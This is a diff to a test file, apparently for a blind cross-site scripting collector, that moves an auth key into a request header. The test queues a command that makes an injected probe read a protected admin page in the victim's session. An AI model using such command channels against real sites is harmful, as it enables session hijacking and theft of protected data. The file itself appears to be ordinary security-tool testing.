@@ -102,8 +102,8 @@ try {
     ok('fire URL identifies the victim page', report.url.includes('/admin/logs'), report.url);
 
     // interactive: read a protected same-origin page AS THE VICTIM
-    await fetch(`http://127.0.0.1:${COLLECTOR}/api/cmd?key=testkey`,
-      { method: 'POST', body: JSON.stringify({ sid, cmd: 'fetch:/admin/secret' }) });
+    await fetch(`http://127.0.0.1:${COLLECTOR}/api/cmd`,
+      { method: 'POST', headers: { 'X-Auth-Key': 'testkey' }, body: JSON.stringify({ sid, cmd: 'fetch:/admin/secret' }) });
     let result = null;
     for (let i = 0; i < 40; i++) {                    // probe polls every 5s
       const c = env._raw.prepare("SELECT * FROM commands WHERE sid=? AND status='done'").get(sid);
